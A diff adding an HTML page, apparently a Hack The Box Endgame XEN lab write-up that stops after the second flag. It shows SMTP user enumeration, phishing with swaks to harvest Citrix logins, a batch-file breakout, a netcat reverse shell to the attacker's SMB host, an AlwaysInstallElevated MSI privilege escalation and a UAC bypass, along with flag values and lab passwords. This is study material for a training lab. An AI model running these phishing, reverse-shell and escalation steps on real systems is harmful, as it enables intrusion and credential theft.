@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Endgame: XEN — QA210</title>
+<meta name="description" content="Hack The Box Endgame XEN walkthrough by QA210. Citrix breakout, Kerberoasting, NetScaler pivoting, PCAP analysis, password spraying, SeBackupPrivilege abuse, and full domain compromise across a small Active Directory environment.">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌀</text></svg>">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ruby.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+:root{--bg-primary:#0d1117;--bg-secondary:#161b22;--bg-tertiary:#1c2333;--bg-code:#0d1117;--border:#30363d;--border-light:#21262d;--text-primary:#e6edf3;--text-secondary:#8b949e;--text-muted:#6e7681;--accent-green:#3fb950;--accent-blue:#58a6ff;--accent-red:#f85149;--accent-yellow:#d29922;--accent-purple:#bc8cff;--accent-orange:#f0883e;--accent-cyan:#00d4aa;--accent-xen:#00e5ff;--accent-xen2:#18ffff;--link:#58a6ff;--link-hover:#79c0ff;--scrollbar-thumb:#30363d;--scrollbar-track:#161b22;--toc-active:#00e5ff;--callout-info-bg:rgba(0,229,255,0.06);--callout-info-border:#00e5ff;--callout-warn-bg:rgba(210,153,34,0.1);--callout-warn-border:#d29922;--callout-danger-bg:rgba(248,81,73,0.1);--callout-danger-border:#f85149;--callout-success-bg:rgba(63,185,80,0.1);--callout-success-border:#3fb950}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--scrollbar-thumb) var(--scrollbar-track)}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.75;font-size:16px}
+#three-bg{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:-1;pointer-events:none;opacity:0.25}
+::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-track{background:var(--scrollbar-track)}::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:4px}::-webkit-scrollbar-thumb:hover{background:#484f58}
+a{color:var(--link);text-decoration:none;transition:color .2s}a:hover{color:var(--link-hover)}
+.site-header{position:sticky;top:0;z-index:100;background:rgba(13,17,23,0.85);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+.site-header .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1.15rem;color:var(--accent-xen);display:flex;align-items:center;gap:8px}
+.site-header .logo .dot{color:var(--accent-red)}
+.site-header nav{display:flex;gap:1.5rem;align-items:center}
+.site-header nav a{color:var(--text-secondary);font-size:.875rem;font-weight:500}
+.site-header nav a:hover{color:var(--text-primary)}
+.hamburger{display:none;background:none;border:none;color:var(--text-primary);cursor:pointer;font-size:1.5rem}
+.page-layout{display:grid;grid-template-columns:260px 1fr;max-width:1400px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc-sidebar{position:sticky;top:56px;height:calc(100vh - 56px);overflow-y:auto;padding:1.5rem 1rem 1.5rem 1.5rem;border-right:1px solid var(--border);background:var(--bg-primary)}
+.toc-sidebar h3{font-size:.75rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-muted);margin-bottom:.75rem;font-weight:600}
+.toc-sidebar ul{list-style:none}.toc-sidebar li{margin-bottom:2px}
+.toc-sidebar a{display:block;padding:4px 8px;border-radius:4px;font-size:.8rem;color:var(--text-secondary);transition:all .15s;line-height:1.4}
+.toc-sidebar a:hover{color:var(--text-primary);background:var(--bg-secondary)}
+.toc-sidebar a.active{color:var(--toc-active);background:rgba(0,229,255,0.08);font-weight:600}
+.toc-sidebar .toc-h3{padding-left:18px;font-size:.75rem}
+.main-content{padding:2.5rem 3rem 4rem;max-width:860px;width:100%}
+.page-hero{margin-bottom:2.5rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}
+.page-hero .box-badge{display:inline-block;background:var(--accent-xen);color:#000;font-size:.7rem;font-weight:700;padding:2px 10px;border-radius:12px;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem}
+.page-hero h1{font-size:2.25rem;font-weight:800;margin-bottom:.5rem;letter-spacing:-.02em}
+.page-hero .meta{color:var(--text-secondary);font-size:.875rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center}
+.page-hero .meta .sep{color:var(--text-muted)}
+.breadcrumbs{font-size:.75rem;color:var(--text-muted);margin-bottom:1rem;font-family:'JetBrains Mono',monospace}
+.breadcrumbs a{color:var(--text-secondary)}.breadcrumbs a:hover{color:var(--link)}.breadcrumbs .sep{margin:0 .4rem}
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem}
+.box-info-card .info-item .label{font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-muted);margin-bottom:2px;font-weight:600}
+.box-info-card .info-item .value{font-size:.95rem;font-weight:600;color:var(--text-primary)}
+.main-content h2{font-size:1.6rem;font-weight:800;margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:2px solid var(--border);letter-spacing:-.01em;scroll-margin-top:70px}
+.main-content h3{font-size:1.15rem;font-weight:700;margin:1.75rem 0 .75rem;color:var(--text-primary);scroll-margin-top:70px}
+.main-content h4{font-size:1rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text-secondary)}
+.main-content p{margin-bottom:1rem;color:var(--text-secondary);line-height:1.8}
+.code-block-wrapper{position:relative;margin:1rem 0 1.25rem;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.code-block-header{display:flex;justify-content:space-between;align-items:center;padding:6px 14px;background:var(--bg-tertiary);border-bottom:1px solid var(--border);font-size:.72rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.code-block-header .lang-label{text-transform:uppercase;font-weight:600;letter-spacing:.04em}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--text-muted);font-size:.7rem;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.copy-btn:hover{color:var(--text-primary);border-color:var(--text-muted)}.copy-btn.copied{color:var(--accent-green);border-color:var(--accent-green)}
+.code-block-wrapper pre{margin:0!important;padding:1rem!important;background:var(--bg-code)!important;font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important;line-height:1.6!important;overflow-x:auto}
+.code-block-wrapper code{font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important}
+p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padding:1px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.82em;color:var(--accent-orange)}
+.callout{padding:.85rem 1rem;border-radius:6px;border-left:3px solid;margin:1rem 0 1.25rem;font-size:.9rem}
+.callout p{margin:0;color:var(--text-secondary)}.callout-title{font-weight:700;font-size:.8rem;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.callout-info{background:var(--callout-info-bg);border-color:var(--callout-info-border)}.callout-info .callout-title{color:var(--callout-info-border)}
+.callout-warn{background:var(--callout-warn-bg);border-color:var(--callout-warn-border)}.callout-warn .callout-title{color:var(--callout-warn-border)}
+.callout-danger{background:var(--callout-danger-bg);border-color:var(--callout-danger-border)}.callout-danger .callout-title{color:var(--callout-danger-border)}
+.callout-success{background:var(--callout-success-bg);border-color:var(--callout-success-border)}.callout-success .callout-title{color:var(--callout-success-border)}
+.attack-path{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.7;overflow-x:auto}
+.attack-path .step{display:flex;align-items:baseline;gap:.5rem;margin-bottom:.25rem}
+.attack-path .arrow{color:var(--accent-xen)}.attack-path .host{color:var(--accent-xen);font-weight:700}.attack-path .technique{color:var(--accent-orange)}.attack-path .cred{color:var(--accent-purple)}.attack-path .finding{color:var(--accent-green)}
+.flag-box{background:rgba(0,229,255,0.06);border:1px solid rgba(0,229,255,0.2);border-radius:8px;padding:1rem 1.25rem;margin:1rem 0 1.5rem;font-family:'JetBrains Mono',monospace}
+.flag-box .flag-label{font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--accent-xen);font-weight:700;margin-bottom:.35rem}
+.flag-box .flag-value{font-size:1rem;font-weight:700;color:var(--text-primary);word-break:break-all}
+.main-content ul,.main-content ol{margin:.5rem 0 1rem 1.5rem;color:var(--text-secondary)}.main-content li{margin-bottom:.35rem;line-height:1.7}
+.main-content table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.85rem}
+.main-content th,.main-content td{padding:8px 12px;border:1px solid var(--border);text-align:left}
+.main-content th{background:var(--bg-secondary);font-weight:600;color:var(--text-primary);font-size:.75rem;text-transform:uppercase;letter-spacing:.04em}
+.main-content td{color:var(--text-secondary)}
+.site-footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;color:var(--text-muted);font-size:.8rem}
+.toc-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:200}.toc-overlay.show{display:block}
+.toc-mobile-panel{display:none;position:fixed;left:0;top:0;bottom:0;width:280px;background:var(--bg-primary);border-right:1px solid var(--border);z-index:201;overflow-y:auto;padding:1.5rem}
+.toc-mobile-panel.show{display:block}
+.toc-mobile-panel .close-btn{background:none;border:none;color:var(--text-secondary);font-size:1.2rem;cursor:pointer;float:right}
+.network-diagram{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.6;overflow-x:auto;white-space:pre;color:var(--text-secondary)}
+.network-diagram .subnet-label{color:var(--accent-xen);font-weight:700}
+.network-diagram .host-label{color:var(--accent-cyan)}
+.network-diagram .arrow-d{color:var(--accent-orange)}
+@media(max-width:1024px){.page-layout{grid-template-columns:1fr}.toc-sidebar{display:none}.hamburger{display:block}.main-content{padding:1.5rem 1.25rem 3rem}.page-hero h1{font-size:1.75rem}}
+@media(max-width:640px){.site-header{padding:0 1rem}.main-content{padding:1rem .75rem 2rem}.page-hero h1{font-size:1.4rem}.box-info-card{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+<canvas id="three-bg"></canvas>
+
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav><a href="/">Home</a><a href="/htb/prolab/">Pro Labs</a><a href="#">Tools</a><a href="#">About</a></nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">&#9776;</button>
+</header>
+
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">&#10005;</button>
+  <h3 style="margin-top:1rem">Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<div class="page-layout">
+<aside class="toc-sidebar"><h3>Contents</h3><ul id="tocDesktop"></ul></aside>
+<main class="main-content">
+
+<div class="page-hero">
+  <div class="breadcrumbs"><a href="/">Home</a><span class="sep">/</span><a href="/htb/prolab/">HTB Pro Lab</a><span class="sep">/</span>Endgame XEN</div>
+  <span class="box-badge">Endgame</span>
+  <h1>HTB Endgame: XEN</h1>
+  <div class="meta"><span>QA210</span><span class="sep">&middot;</span><span>2025</span><span class="sep">&middot;</span><span>Citrix Breakout &middot; Kerberoast &middot; AD Compromise &middot; 6 Flags</span></div>
+</div>
+
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Lab</div><div class="value">Endgame XEN</div></div>
+  <div class="info-item"><div class="label">Category</div><div class="value" style="color:var(--accent-xen)">AD Penetration Testing</div></div>
+  <div class="info-item"><div class="label">Subnets</div><div class="value">2 (10.13.38.0/24, 172.16.249.0/24)</div></div>
+  <div class="info-item"><div class="label">Flags</div><div class="value">6</div></div>
+  <div class="info-item"><div class="label">Hosts</div><div class="value">6 (DC, Citrix, NetScaler, 3 vDesktops)</div></div>
+  <div class="info-item"><div class="label">Key Techniques</div><div class="value">Phishing, Citrix Breakout, Kerberoast, PCAP, Password Spray, SeBackupPrivilege</div></div>
+</div>
+
+<div class="network-diagram">
+<span class="subnet-label">═══ EXTERNAL (10.13.38.0/24) ═══</span>
+  <span class="arrow-d">├──</span> <span class="host-label">10.13.38.12</span>  CITRIX (SMTP 25 / HTTP 80 / HTTPS 443)
+  <span class="arrow-d">│</span>
+<span class="subnet-label">═══ INTERNAL (172.16.249.0/24) ═══</span>
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.249.200</span>  XEN-DC (Domain Controller)
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.249.201</span>  CITRIX (XenApp Server)
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.249.202</span>  NETSCALER (FreeBSD Gateway)
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.249.203</span>  VDESKTOP1 (Citrix VDI)
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.249.204</span>  VDESKTOP2 (Citrix VDI)
+  <span class="arrow-d">└──</span> <span class="host-label">172.16.249.205</span>  VDESKTOP3 (Citrix VDI)</div>
+
+<div class="attack-path">
+  <div class="step"><span class="host">CITRIX</span> <span class="arrow">&rarr;</span> <span class="technique">SMTP User Enum + Phishing (swaks)</span> <span class="arrow">&rarr;</span> <span class="cred">pmorgan / Summer1Summer!</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Citrix VDI Login + .bat Bypass</span> <span class="arrow">&rarr;</span> <span class="finding">Breach Flag</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">AlwaysInstallElevated + UAC Bypass</span> <span class="arrow">&rarr;</span> <span class="finding">Deploy Flag</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Meterpreter + Kerberoast (mturner)</span> <span class="arrow">&rarr;</span> <span class="finding">Ghost Flag (SMB)</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">PPK Crack + NetScaler SSH + tcpdump</span> <span class="arrow">&rarr;</span> <span class="finding">Camouflage Flag (LDAP)</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Password Spray (#S3rvice#@cc)</span> <span class="arrow">&rarr;</span> <span class="cred">backup-svc</span> <span class="arrow">&rarr;</span> <span class="finding">Doppelganger Flag</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">SeBackupPrivilege + diskshadow + ntds.dit</span> <span class="arrow">&rarr;</span> <span class="host">DC</span> <span class="arrow">&rarr;</span> <span class="finding">Owned Flag (DA)</span></div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="overview">Lab Overview</h2>
+
+<p>Endgame XEN is a Hack The Box lab that simulates a realistic corporate penetration test against Humongous Retail, a nationwide chain that has invested heavily in their POS systems after several skimming incidents. The environment is built around a Citrix virtual desktop infrastructure (VDI) and a small Active Directory domain, and it tests your skills across the entire kill chain: enumeration, phishing, Citrix breakout, privilege escalation, lateral movement, Kerberoasting, network traffic analysis, password spraying, and ultimately full domain compromise by abusing backup privileges to extract the Active Directory database.</p>
+
+<p>The lab contains six hosts spread across two subnets. The external-facing Citrix server sits at 10.13.38.12 and is the only directly accessible host from the attacker VPN. Once a foothold is established through the Citrix VDI, the internal 172.16.249.0/24 network reveals a Domain Controller, the Citrix application server, a NetScaler gateway running FreeBSD, and three virtual desktops. The attack path requires chaining multiple techniques together and pivoting through the network while managing credentials harvested at each stage.</p>
+
+<p>What makes XEN unique among HTB labs is the emphasis on Citrix virtual desktop environments. Breaking out of the restricted Citrix session is a skill rarely tested in CTF challenges but extremely common in real-world red team engagements. The lab also features an excellent progression from external phishing through internal AD attacks, demonstrating how a single compromised service account password can cascade into complete domain compromise through credential reuse and weak permissions.</p>
+
+<div class="callout callout-info">
+  <div class="callout-title">Lab Hosts</div>
+  <p>XEN-DC (Domain Controller), XEN-Citrix (XenApp Server), XEN-NetScaler (FreeBSD Gateway), XEN-vDesktop1/2/3 (Citrix VDI sessions). The external IP is 10.13.38.12. All internal hosts are on 172.16.249.0/24.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="breach">Flag 1 — Breach: Citrix Foothold</h2>
+
+<h3 id="nmap">Reconnaissance with Nmap</h3>
+
+<p>The initial scan against the external IP reveals three open TCP ports: SMTP on port 25, HTTP on port 80, and HTTPS on port 443. The SMTP banner identifies the hostname as <code>EXCHANGE.HTB.LOCAL</code>, which immediately tells us we are dealing with an Active Directory environment. The IIS version 7.5 suggests Windows Server 2008 R2 or a similar vintage, and the SSL configuration supports the legacy SSLv2 protocol with weak ciphers, indicating an older infrastructure that may have other misconfigurations:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.13.38.12
+
+PORT    STATE    SERVICE
+25/tcp  open     smtp
+80/tcp  open     http
+443/tcp open     https
+
+nmap -sV -sC -p 25,80,443 -oA scans/nmap-scripts 10.13.38.12
+
+PORT    STATE SERVICE  VERSION
+25/tcp  open  smtp
+| smtp-commands: CITRIX, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| fingerprint-strings:
+|   Hello: 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
+80/tcp  open  http     Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Did not follow redirect to https://humongousretail.com/
+443/tcp open  ssl/https?
+|_ssl-date: 2019-05-11T12:58:14+00:00; -3m18s from scanner time
+| sslv2: SSLv2 supported</code></pre>
+</div>
+
+<p>The HTTP redirect to <code>https://humongousretail.com/</code> gives us the domain name for the organization, which will be critical for SMTP user enumeration and phishing. After adding the domain to our hosts file and visiting the HTTPS site, we find a corporate retail website. The most useful piece of information on the page is a contact email address at the bottom: <code>jointheteam@humongousretail.com</code>, which confirms the email domain format.</p>
+
+<h3 id="gobuster">Directory Brute Force</h3>
+
+<p>Running a directory brute force against the HTTPS site with gobuster reveals a critical hidden path. While the standard <code>/images</code>, <code>/css</code>, and <code>/js</code> directories are expected, the <code>/remote</code> endpoint stands out as unusual and potentially interesting:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">gobuster dir -k -u https://humongousretail.com \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+  -t 30 -o scans/gobuster-results
+
+/images  (Status: 301)
+/css     (Status: 301)
+/js      (Status: 301)
+/remote  (Status: 301)</code></pre>
+</div>
+
+<p>Navigating to <code>/remote</code> presents a Citrix login page. This is a Citrix XenApp virtual desktop interface that allows authenticated users to access a remote Windows desktop session. Attempting basic credentials fails, but we now know the attack surface: we need valid domain credentials to access the Citrix environment.</p>
+
+<h3 id="smtp-enum">SMTP User Enumeration</h3>
+
+<p>With the SMTP service on port 25 and a known email domain, we can enumerate valid email addresses using <code>smtp-user-enum</code>. This tool leverages the SMTP VRFY, RCPT TO, and EXPN commands to identify which email addresses exist on the mail server. Running it against a large username wordlist with the <code>humongousretail.com</code> domain and the RCPT TO method yields four valid accounts:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">smtp-user-enum -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt \
+  -D humongousretail.com -t 10.13.38.12 -m 50 -M RCPT
+
+######## Scan started #########
+10.13.38.12: it@humongousretail.com exists
+10.13.38.12: legal@humongousretail.com exists
+10.13.38.12: marketing@humongousretail.com exists
+10.13.38.12: sales@humongousretail.com exists
+######## Scan completed #########</code></pre>
+</div>
+
+<p>We now have five email addresses including the original contact address: <code>it@</code>, <code>legal@</code>, <code>marketing@</code>, <code>sales@</code>, and <code>jointheteam@</code>. These represent department-level distribution groups or shared mailboxes, with the IT and Sales departments being the most promising targets for a phishing campaign.</p>
+
+<h3 id="phishing">Phishing for Citrix Credentials</h3>
+
+<p>The goal is to obtain valid credentials for the Citrix login at <code>/remote</code>. After experimentation, a successful phishing email requires several specific criteria: the message must be sent <strong>to</strong> <code>sales@humongousretail.com</code>, <strong>from</strong> <code>it@humongousretail.com</code>, with the word <strong>"citrix"</strong> and a <strong>URL</strong> in the body. This combination triggers an automated process that attempts to log in to the Citrix portal using real credentials, and the login attempt is sent back to the URL in the email body.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Send phishing email with swaks
+swaks --to sales@humongousretail.com \
+  --from it@humongousretail.com \
+  --header "Subject: Credentials / Errors" \
+  --body "citrix http://10.14.15.41/" \
+  --server humongousretail.com
+
+# Listen with netcat to capture the POST request
+nc -lnvp 80
+
+Ncat: Connection from 10.13.38.12:50123.
+POST /remote/auth/login.aspx?LoginType=Explicit&user=awardel&password=%40M3m3ntoM0ri%40&domain=HTB.LOCAL HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
+Host: 10.14.15.41
+
+LoginType=Explicit&user=awardel&password=%40M3m3ntoM0ri%40&domain=HTB.LOCAL</code></pre>
+</div>
+
+<p>After sending the phishing email, the automated victim almost immediately posts credentials back to our listener. By sending multiple emails and capturing each response, we collect three sets of valid domain credentials. Each login attempt includes the username, password, and domain (HTB.LOCAL), giving us everything needed to access the Citrix environment:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">text</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Harvested credentials from phishing:
+jmendes  / VivaBARC3L0N@!!!
+awardel  / @M3m3ntoM0ri@
+pmorgan  / Summer1Summer!</code></pre>
+</div>
+
+<div class="callout callout-warn">
+  <div class="callout-title">Phishing Mechanism</div>
+  <p>The lab uses automation to simulate a user clicking the phishing link and submitting their Citrix credentials. The three different credential sets exist because only one user can be logged into the Citrix desktop at a time, and providing multiple accounts reduces the chance of players bumping each other off the session during the lab.</p>
+</div>
+
+<h3 id="citrix-login">Citrix Desktop Access</h3>
+
+<p>With valid credentials in hand, we log in to the Citrix portal at <code>/remote</code>. The Citrix Receiver must be installed on the attacker machine to handle the <code>.ica</code> session files that the portal downloads. On Linux, the 64-bit Citrix Receiver package can be obtained from Citrix directly and installed to <code>/opt/Citrix/ICAClient/</code>. After logging in with any of the three credential sets, the portal presents a single desktop icon. Clicking it downloads an .ica file that opens a full Windows desktop session.</p>
+
+<p>On the desktop, a file named <code>flag.txt</code> is immediately visible, containing the first flag:</p>
+
+<div class="flag-box"><div class="flag-label">Flag 1 — Breach</div><div class="flag-value">XEN{wh0_n33d5_2f@?}</div></div>
+
+<div class="callout callout-success">
+  <div class="callout-title">Foothold Achieved</div>
+  <p>We have access to a Citrix virtual desktop session as a domain user. The flag name "wh0_n33d5_2f@?" humorously references the fact that we obtained access through phishing rather than traditional two-factor authentication bypass. Now we need to break out of the restricted Citrix environment.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="deploy">Flag 2 — Deploy: Breakout &amp; Privilege Escalation</h2>
+
+<h3 id="restrictions">Citrix Restricted Environment Bypass</h3>
+
+<p>The Citrix desktop is heavily restricted. There is no access to <code>cmd.exe</code> or <code>powershell.exe</code> from the Start Menu, and navigating to <code>C:\Windows\System32</code> in Explorer results in an access denied error. Even attempting to access an SMB share hosted on the attacker machine is blocked by Explorer. However, Citrix restrictions typically have gaps, and the classic bypass technique involves abusing <code>notepad.exe</code> to launch a command prompt.</p>
+
+<p>The bypass works by right-clicking in the user's Documents folder to create a new text file, then opening it with Notepad. Inside Notepad, we type <code>cmd.exe</code> and save the file as <code>cmd.bat</code> (making sure to change the "Save as type" dropdown to "All files" so Windows does not append <code>.txt</code>). Double-clicking the batch file launches <code>cmd.exe</code>, because the Citrix restriction policy blocks the executable binary but not batch file invocations of it:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">cmd</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Create cmd.bat with content: cmd.exe
+# Double-click to launch command prompt
+
+C:\Users\pmorgan\Documents></code></pre>
+</div>
+
+<p>With a command prompt available, we can establish a more stable reverse shell. Uploading <code>nc64.exe</code> to an SMB share on the attacker machine and executing it provides a reliable netcat shell:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">cmd</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># On the Citrix desktop, run netcat from attacker SMB share
+\\10.14.15.41\share\nc64.exe 10.14.15.41 443 -e cmd.exe
+
+# On attacker machine
+rlwrap nc -lnvp 443
+
+Ncat: Connection from 10.13.38.15:50549.
+Microsoft Windows [Version 6.1.7601]
+C:\Users\pmorgan\Documents></code></pre>
+</div>
+
+<h3 id="alwaysinstallelevated">AlwaysInstallElevated Exploitation</h3>
+
+<p>Running PowerUp.ps1 to check for common privilege escalation vectors reveals that the <code>AlwaysInstallElevated</code> registry key is enabled under both <code>HKCU</code> and <code>HKLM</code>. This misconfiguration means that any MSI (Microsoft Installer) package will run with elevated (SYSTEM) privileges, regardless of who executes it. This is a well-known privilege escalation vector in Windows environments where administrators have enabled this setting for convenience:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">cmd</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1</code></pre>
+</div>
+
+<p>To exploit this, we use PowerUp's <code>Write-UserAddMSI</code> function, which generates a malicious MSI package that creates a new local administrator account when executed. The MSI runs with SYSTEM privileges thanks to AlwaysInstallElevated, so the user it creates is automatically added to the local Administrators group. After running the MSI and providing a password that meets the domain's complexity requirements, the new admin user is created:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Import PowerUp and generate malicious MSI
+Import-Module PowerUp.ps1
+Write-UserAddMSI
+
+# Execute the MSI (runs as SYSTEM via AlwaysInstallElevated)
+# Create user: qa210 / P@ssw0rd2024!
+
+# Verify new admin user
+net user qa210
+# The command completed successfully.
+
+# Get a shell as the new admin
+runas /user:qa210 cmd.exe</code></pre>
+</div>
+
+<h3 id="uac-bypass">UAC Bypass</h3>
+
+<p>Even though our new user is a local administrator, UAC (User Account Control) still restricts the session to medium integrity by default. Accessing the Administrator's desktop folder is denied because the shell is running as a low-privilege token. To bypass UAC, we use a well-known DLL reflection technique that exploits the way Windows handles certain auto-elevating COM objects. The technique compiles a C# DLL that is loaded via reflection in PowerShell, and calling its <code>Execute()</code> method spawns a new <code>cmd.exe</code> that inherits the full administrator token:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Load UAC bypass DLL via reflection
+[System.Reflection.Assembly]::LoadFile("C:\programdata\uac_bypass.dll")
+
+# Execute the bypass to spawn elevated cmd.exe
+[UACBypass]::Execute()
+
+# The new cmd.exe now runs at high integrity
+C:\Windows\system32> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+SeDebugPrivilege              Enabled
+SeTakeOwnershipPrivilege      Enabled
+SeLoadDriverPrivilege         Enabled
+...</code></pre>
+</div>
+
+<p>With the UAC bypassed and a high-integrity shell in hand, we can now access the Administrator's desktop and retrieve the second flag:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">cmd</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">C:\Users\Administrator\Desktop> type flag.txt
+XEN{7ru573d_1n574ll3r5}</code></pre>
